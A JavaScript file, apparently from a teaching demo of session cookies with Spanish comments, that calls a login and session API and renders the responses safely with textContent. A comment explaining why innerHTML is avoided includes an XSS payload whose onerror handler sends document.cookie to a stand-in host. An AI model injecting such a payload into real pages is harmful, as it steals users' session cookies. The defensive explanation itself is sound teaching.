// public/demo.js — JavaScript de la página de la demo de sesiones.
// Esta página NO guarda ni lee la cookie de sesión: eso lo hace el navegador.
// Aquí solo se llama a la API con fetch y se pinta lo que responde.

const $ = (id) => document.getElementById(id);

// ---------------------------------------------------------------------------
// ETAPA 1 · Una sola función para hablar con la API
// ---------------------------------------------------------------------------
// Por qué una sola: los ocho endpoints tienen el mismo contrato — JSON de
// entrada, JSON de salida y un código HTTP que dice si salió bien. Escribir
// ocho fetch sería repetir el mismo manejo de errores ocho veces.
async function llamar(metodo, url, cuerpo) {
  const opciones = { method: metodo };

  // express.json() solo lee el cuerpo si el encabezado dice que es JSON.
  // Lo mandamos únicamente cuando hay cuerpo: en un GET no aporta nada.
  if (cuerpo !== undefined) {
    opciones.headers = { 'Content-Type': 'application/json' };
    opciones.body = JSON.stringify(cuerpo);
  }

  // fetch NO lanza error con un 401 o un 500: para él la petición "salió bien".
  // El código real viene en respuesta.status, por eso lo devolvemos hacia afuera.
  const respuesta = await fetch(url, opciones);

  // Si el servidor no devuelve JSON (un error raro, una página de error),
  // respuesta.json() lanza. Se atrapa para que datos quede en null y la página
  // no se caiga: es preferible una bitácora sin JSON que una consola en rojo.
  let datos = null;
  try {
    datos = await respuesta.json();
  } catch {
    datos = null;
  }

  // No hace falta credentials: 'include' porque index.html y la API están en el
  // mismo origen (mismo host y mismo puerto), y el navegador manda la cookie
  // solo. Sí haría falta si la API viviera en otro puerto o dominio —el caso
  // del proyecto de Next.js— y además el servidor tendría que permitirlo con CORS.
  return { status: respuesta.status, datos };
}

// ---------------------------------------------------------------------------
// ETAPA 2 · La bitácora
// ---------------------------------------------------------------------------
// Por qué textContent y no innerHTML: lo que devuelve el servidor incluye texto
// escrito por personas (nombres, usuarios). Con innerHTML ese texto se
// interpretaría como HTML y habilitaría XSS; por ejemplo, un nombre como
// <img src=x onerror="fetch('//malo/'+document.cookie)"> ejecutaría código y
// podría robar la cookie si no fuera httpOnly. Con textContent es texto plano.
function claseDelCodigo(status) {
  if (status >= 200 && status < 300) return 'codigo ok';
  if (status === 401) return 'codigo e401';
  if (status === 403) return 'codigo e403';
  return 'codigo error';
}

function anotar(metodo, url, status, datos) {
  const li = document.createElement('li');

  const codigo = document.createElement('span');
  codigo.className = claseDelCodigo(status);
  codigo.textContent = String(status);

  const titulo = document.createElement('span');
  titulo.textContent = ` ${metodo} ${url}`;

  const json = document.createElement('pre');
  json.textContent = datos === null ? '(sin JSON)' : JSON.stringify(datos, null, 2);

  li.append(codigo, titulo, json);

  // prepend inserta al principio. Como el <ol> tiene el atributo reversed,
  // la respuesta más nueva es la que queda arriba y se ve sin hacer scroll.
  $('bitacora').prepend(li);
}

// ---------------------------------------------------------------------------
// ETAPA 3 · ¿Quién soy para el servidor?
// ---------------------------------------------------------------------------
// Por qué hay que preguntar: la cookie es httpOnly, así que el navegador la
// manda en cada petición pero document.cookie no la muestra. La página no puede
// saber quién es por su cuenta; el único que puede leer la sesión es el servidor.
async function mostrarEstado() {
  const { status, datos } = await llamar('GET', '/api/sesion');
  const estado = $('estado');

  if (status === 200 && datos && datos.usuario) {
    estado.textContent =
      `${datos.usuario.nombre} (${datos.usuario.rol}) · sesión ${datos.sesion} · ` +
      `vence en ${datos.expiraEnSegundos} s`;
    estado.className = 'estado con-sesion';
  } else {
    estado.textContent = 'Sin sesión (el servidor responde 401)';
    estado.className = 'estado sin-sesion';
  }

  // Lo que el JavaScript de la página alcanza a leer. Con httpOnly: true sale
  // vacío aunque haya sesión: esa es exactamente la prueba P-09.
  $('cookie-js').textContent = document.cookie || '(vacío)';
}

// ---------------------------------------------------------------------------
// ETAPA 4 · La tabla de sesiones del servidor
// ---------------------------------------------------------------------------
// Por qué se reconstruye entera: el servidor es la fuente de verdad (las
// sesiones cambian por debajo, desde otras pestañas o desde MySQL). Volver a
// pedir la lista y repintarla evita trabajar con datos viejos.
async function mostrarTabla() {
  const { datos } = await llamar('GET', '/api/diagnostico/sesiones');
  const cuerpo = $('tabla-sesiones');

  // Vaciar antes de llenar: si no, cada clic iría agregando filas debajo de las
  // anteriores y la tabla se duplicaría (la prueba pide pulsar varias veces).
  cuerpo.textContent = '';

  if (!datos) {
    $('donde').textContent = 'No se pudo consultar el diagnóstico.';
    return;
  }

  // Se muestra de dónde salió el dato, no se adivina: lo decide config.js y el
  // servidor lo reporta en "almacen".
  $('donde').textContent = datos.almacen === 'mysql'
    ? 'En MySQL, tabla sessions (sobreviven a que reinicies el servidor).'
    : 'En la memoria del servidor (se pierden al reiniciar).';

  const sesiones = datos.sesiones || [];

  if (sesiones.length === 0) {
    const fila = document.createElement('tr');
    const celda = document.createElement('td');
    celda.colSpan = 4;
    celda.textContent = '(sin sesiones)';
    fila.append(celda);
    cuerpo.append(fila);
    return;
  }

  for (const sesion of sesiones) {
    const fila = document.createElement('tr');
    if (sesion.esLaTuya) fila.className = 'tuya';

    const celdas = [
      sesion.sesion + (sesion.esLaTuya ? ' (la tuya)' : ''),
      sesion.usuario,
      String(sesion.visitas),
      // "expira" llega como fecha ISO en texto. Date la entiende y
      // toLocaleString la pasa a la hora local de tu equipo.
      sesion.expira ? new Date(sesion.expira).toLocaleString() : '—',
    ];

    // Otra vez textContent: los usuarios vienen de la base de datos.
    for (const texto of celdas) {
      const celda = document.createElement('td');
      celda.textContent = texto;
      fila.append(celda);
    }

    cuerpo.append(fila);
  }
}

// ---------------------------------------------------------------------------
// ETAPA 5 · Los eventos
// ---------------------------------------------------------------------------
// Por qué una función que junte las dos: casi toda acción cambia el estado Y la
// tabla (login, logout, visita). Tenerlo en un solo lugar evita olvidar una de
// las dos en alguna rama y que la página quede mostrando datos viejos.
async function refrescarTodo() {
  await Promise.all([mostrarEstado(), mostrarTabla()]);
}

// El formulario: submit se dispara al pulsar Entrar o al presionar Enter.
$('form-login').addEventListener('submit', async (evento) => {
  // Sin preventDefault el navegador navega a la misma página y se pierde la
  // bitácora. La idea de la demo es ver la respuesta sin recargar.
  evento.preventDefault();

  const cuerpo = {
    usuario: $('usuario').value,
    contrasena: $('contrasena').value,
  };

  const { status, datos } = await llamar('POST', '/api/login', cuerpo);
  anotar('POST', '/api/login', status, datos);

  await refrescarTodo();
});

// Un solo listener para todos los botones con data-url. Así, si mañana se
// agrega otro botón en index.html, funciona sin tocar este archivo.
for (const boton of document.querySelectorAll('button[data-url]')) {
  boton.addEventListener('click', async () => {
    // dataset convierte data-metodo y data-url en boton.dataset.metodo/url.
    const metodo = boton.dataset.metodo;
    const url = boton.dataset.url;

    const { status, datos } = await llamar(metodo, url);
    anotar(metodo, url, status, datos);

    await refrescarTodo();
  });
}

// Cambiar el usuario debe cambiar su contraseña de ejemplo: <usuario>12345.
// El evento es "change" porque "input" se dispara también al usar el teclado.
$('usuario').addEventListener('change', () => {
  $('contrasena').value = `${$('usuario').value}12345`;
});

// Estos dos botones solo repiten lo que ya piden otras funciones.
$('btn-refrescar').addEventListener('click', refrescarTodo);
$('btn-sesiones').addEventListener('click', mostrarTabla);

// ---------------------------------------------------------------------------
// ETAPA 6 · Al cargar la página
// ---------------------------------------------------------------------------
// Por qué no hace falta esperar DOMContentLoaded: el <script src="demo.js"> está
// al final del <body> (línea 70 de index.html), así que cuando este archivo se
// ejecuta, todos los elementos de arriba ya existen en el DOM.
async function mostrarConfig() {
  const { datos } = await llamar('GET', '/api/config');
  // JSON.stringify con 2 espacios: el <pre> respeta los saltos y la sangría.
  $('config').textContent = datos === null ? '(no disponible)' : JSON.stringify(datos, null, 2);
}

// Arranque: primero la configuración (no depende de la sesión) y luego el
// estado y la tabla, que sí dependen de si hay sesión o no.
(async () => {
  await mostrarConfig();
  await refrescarTodo();
})();
